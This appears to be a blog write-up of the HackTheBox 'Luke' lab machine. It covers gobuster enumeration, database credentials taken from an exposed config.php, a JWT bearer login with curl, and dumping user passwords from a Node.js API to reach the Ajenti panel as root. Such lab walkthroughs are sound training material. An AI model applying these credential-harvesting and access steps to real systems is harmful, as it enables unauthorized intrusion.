---
title: "HackTheBox - WriteUp 17"
date: 2019-07-18T23:13:19+08:00
description: "HackTheBox 练手 - Luke - JWT Enum - FreeBSD"
featuredImage: "https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp"
categories: ["tech"]
draft: false
displayInMenu: false
displayInList: true
dropCap: false
---

# Luke

Nmap: 22(Useless), 21(VSftpd), 80(Apache), 3000(Express.js Nodejs Web), 8000(Ajenti Web Management)

# User

Enum 80: `gobuster dir -u http://10.10.10.137 -s 200,204,301,302,307,401,403 -o /tmp/luke80.log -w ./directory-list-2.3-medium.txt -x html,php,htm,txt`

Result:

```
/index.html (Status: 200)
/login.php (Status: 200)
/member (Status: 301)
/management (Status: 401)
/css (Status: 301)
/js (Status: 301)
/vendor (Status: 301)
/config.php (Status: 200)
/LICENSE (Status: 200)
```

Got DB creds from `/config.php`: `root:Zk6heYCyv6ZE9Xcg`

Then replace admin from `root` to `admin`, Use JWT Bearer Auth to get token, after getting token, run Gobuster, found the api path, get each API to get user credentials

```bash
$ curl -s -k -X POST -H 'Accept: application/json' -H 'Content-Type: application/json' --data '{"username":"admin", "password":"Zk6heYCyv6ZE9Xcg", "rememberMe": false}' http://10.10.10.137:3000/login -v 

{"success":true,"message":"Authentication successful!","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYzNDE4NzUyLCJleHAiOjE1NjM1MDUxNTJ9.7EcV_r1WzzE7AiFn5pfORs5i1ycusX_6CEQ7AGMurrk"}

$ gobuster dir -u http://10.10.10.137:3000 -s 200,204,301,302,307,401,403 -o /tmp/luke3000.log -w ./directory-list-2.3-medium.txt -x html,php,htm,txt
/login (Status: 200)
/users (Status: 200)
/Login (Status: 200)
/Users (Status: 200)

$ curl -H 'Accept: application/json' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYzNDE4NzUyLCJleHAiOjE1NjM1MDUxNTJ9.7EcV_r1WzzE7AiFn5pfORs5i1ycusX_6CEQ7AGMurrk' http://10.10.10.137:3000/users

[{"ID":"1","name":"Admin","Role":"Superuser"},{"ID":"2","name":"Derry","Role":"Web Admin"},{"ID":"3","name":"Yuri","Role":"Beta Tester"},{"ID":"4","name":"Dory","Role":"Supporter"}]

$ curl -H 'Accept: application/json' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYzNDE4NzUyLCJleHAiOjE1NjM1MDUxNTJ9.7EcV_r1WzzE7AiFn5pfORs5i1ycusX_6CEQ7AGMurrk' http://10.10.10.137:3000/users/Derry

{"name":"Derry","password":"rZ86wwLvx7jUxtch"}
{"name":"Admin","password":"WX5b7)>/rp$U)FW"}
{"name":"Yuri","password":"bet@tester87"}
{"name":"Dory","password":"5y:!xa=ybfe)/QD"}
```

Use Derry's creds, go to `:80/management`, found `config.json` contains password: `KpMasng6S5EtTy9Z` and keywords `ajenti`.

Use username `root`, logged into 8000 Port. After you get control panel access, you've already rooted.

Get everything you want.

(END)

# Referrence

- https://medium.com/@nieldw/using-curl-to-authenticate-with-jwt-bearer-tokens-55b7fac506bd
